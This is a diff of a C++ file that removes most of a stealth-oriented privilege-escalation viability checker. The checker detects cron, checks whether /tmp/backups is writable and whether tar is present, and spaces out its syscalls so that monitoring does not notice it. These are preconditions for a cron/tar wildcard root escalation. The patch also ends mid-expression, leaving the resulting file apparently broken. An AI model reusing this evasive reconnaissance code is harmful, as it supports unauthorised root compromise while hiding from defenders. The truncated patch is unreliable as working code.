@@ -17,7 +17,7 @@
 #include <sys/syscall.h>
 #include <sys/stat.h>
 #include <fcntl.h>
-#include <dirent.h>
+#include <linux/dirent.h>
 #include <cstring>
 
 // ============================================================================
@@ -66,14 +66,6 @@ static bool str_contains(const char* haystack, const char* needle) {
     }
     
     return false;
-}
-
-static bool is_numeric(const char* str) {
-    if (!str || !str[0]) return false;
-    for (int i = 0; str[i]; i++) {
-        if (str[i] < '0' || str[i] > '9') return false;
-    }
-    return true;
 }
 
 // ============================================================================
@@ -259,93 +251,4 @@ static bool check_cron_running_stealthy() {
                 
                 // Check for cron/crond
                 if (str_equals(comm_buf, "cron\n") || 
-                    str_equals(comm_buf, "crond\n")) {
-                    return true;
-                }
-            }
-        }
-        
-        // STEALTH: Add micro-delays every 50 PIDs to avoid syscall spikes
-        if (pid % 50 == 0) {
-            struct timespec micro_sleep = {0, 1000000};  // 1ms
-            syscall(SYS_nanosleep, &micro_sleep, nullptr);
-        }
-    }
-    
-    // ========================================================================
-    // Strategy 4: Check systemd timer directory (no process enumeration)
-    // ========================================================================
-    if (syscall(SYS_access, "/etc/systemd/system/timers.target.wants", F_OK) == 0) {
-        // If timers.target.wants exists, systemd timers (cron alternative) likely active
-        return true;
-    }
-    
-    return false;
-}
-
-// ============================================================================
-// STEALTH-ENHANCED USERNAME RETRIEVAL
-// ============================================================================
-
-// Get current username (stealthy - uses only syscalls, no file reads)
-static void get_username_stealthy(char* buf, int max_len) {
-    // Just return UID as string - no filesystem reads
-    // STEALTH IMPROVEMENT: Zero file system access
-    unsigned int uid = syscall(SYS_getuid);
-    
-    // Convert UID to string manually
-    if (uid == 0) {
-        str_copy(buf, "0", max_len);
-        return;
-    }
-    
-    char uid_str[16];
-    int pos = 0;
-    unsigned int temp_uid = uid;
-    
-    // Convert to string in reverse
-    char temp[16];
-    int temp_pos = 0;
-    while (temp_uid > 0) {
-        temp[temp_pos++] = '0' + (temp_uid % 10);
-        temp_uid /= 10;
-    }
-    
-    // Reverse into output buffer
-    for (int i = temp_pos - 1; i >= 0; i--) {
-        uid_str[pos++] = temp[i];
-    }
-    uid_str[pos] = '\0';
-    
-    str_copy(buf, uid_str, max_len);
-}
-
-// ============================================================================
-// MAIN CHECK FUNCTION (STEALTH-ENHANCED)
-// ============================================================================
-
-PrivEscConditions check_privesc_viability() {
-    PrivEscConditions conditions;
-    memset(&conditions, 0, sizeof(conditions));
-    
-    // Get current UID (single syscall - unavoidable)
-    conditions.current_uid = syscall(SYS_getuid);
-    
-    // Get username (no filesystem access)
-    get_username_stealthy(conditions.username, sizeof(conditions.username));
-    
-    // Check /tmp/backups directory (single stat call - NO file creation)
-    // STEALTH: Uses access() then stat() - no test file artifacts
-    conditions.backups_dir_exists = (syscall(SYS_access, "/tmp/backups", F_OK) == 0);
-    conditions.backups_dir_writable = check_directory_writable_stealthy("/tmp/backups");
-    
-    // Check tar availability (single stat call per path)
-    // STEALTH: No process spawning
-    conditions.tar_available = check_tar_available_stealthy();
-    
-    // Check if cron is running (minimal process checks)
-    // STEALTH: Multi-strategy with ~95% fewer syscalls
-    conditions.cron_running = check_cron_running_stealthy();
-    
-    return conditions;
-}
+                    str_equals(comm_buf, 
